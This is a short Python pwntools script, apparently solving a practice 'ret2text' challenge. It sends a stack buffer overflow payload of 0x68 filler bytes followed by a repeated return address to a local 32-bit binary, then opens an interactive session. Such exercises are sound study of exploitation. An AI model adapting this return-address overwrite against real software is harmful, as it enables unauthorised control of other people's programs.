from pwn import *

p = process('cmake-build-debug/ret2text32')
p.send('a' * 0x68 + p32(0x080492D0) * 3)
p.interactive()
